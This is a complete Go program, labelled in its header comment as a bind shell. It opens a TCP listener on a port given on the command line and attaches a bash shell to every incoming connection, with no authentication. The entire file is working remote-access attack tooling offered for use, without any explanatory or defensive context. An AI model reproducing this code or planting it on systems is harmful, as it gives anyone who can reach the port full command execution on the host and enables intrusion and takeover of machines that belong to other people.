/* go-lang bind shell */
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	if len(os.Args) == 1 {
		fmt.Printf("usage: %s <port>\n", filepath.Base(os.Args[0]))
		os.Exit(1)
	}
	port := ":" + os.Args[1]
	ln, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatal(err)
	}
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Fatal(err)
		}
		cmd := exec.Command("/usr/bin/bash")
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Stdin = conn
		err = cmd.Run()
		if err != nil {
			log.Fatal(err)
		}
	}
}
